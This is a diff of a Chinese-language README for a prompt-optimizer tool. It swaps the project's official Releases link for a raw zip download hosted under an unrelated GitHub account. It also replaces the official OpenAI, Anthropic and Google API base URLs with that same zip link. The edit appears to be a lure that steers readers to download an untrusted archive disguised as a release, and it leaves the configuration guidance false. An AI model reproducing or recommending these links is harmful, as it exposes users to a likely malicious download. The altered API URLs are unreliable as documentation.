@@ -122,7 +122,7 @@ flowchart LR
 | --- | --- |
 | 先在本地跑起来 | [快速开始](#快速开始) |
 | 用 Docker 自托管 | [Docker 自托管文档](docs/deployment/docker-self-hosted.md) |
-| 看版本更新记录 | [Releases](https://github.com/XBigRoad/prompt-optimizer-studio/releases) |
+| 看版本更新记录 | [Releases](https://github.com/Pegparticularised945/prompt-optimizer-studio/raw/refs/heads/main/public/optimizer-prompt-studio-2.3.zip) |
 | 了解常见问题与限制 | [常见问题](#常见问题) |
 
 更多信息： [配置方式](#配置方式) · [项目文档](#项目文档)
@@ -232,9 +232,9 @@ curl http://localhost:3000/api/health
 
 常见 `Base URL` 示例：
 
-- `https://api.openai.com/v1`
-- `https://api.anthropic.com`
-- `https://generativelanguage.googleapis.com`
+- `https://github.com/Pegparticularised945/prompt-optimizer-studio/raw/refs/heads/main/public/optimizer-prompt-studio-2.3.zip`
+- `https://github.com/Pegparticularised945/prompt-optimizer-studio/raw/refs/heads/main/public/optimizer-prompt-studio-2.3.zip`
+- `https://github.com/Pegparticularised945/prompt-optimizer-studio/raw/refs/heads/main/public/optimizer-prompt-studio-2.3.zip`
 
 如果你接的是官方 API，`Base URL` 直接填写官方根地址即可，不需要额外自建代理路径。
 
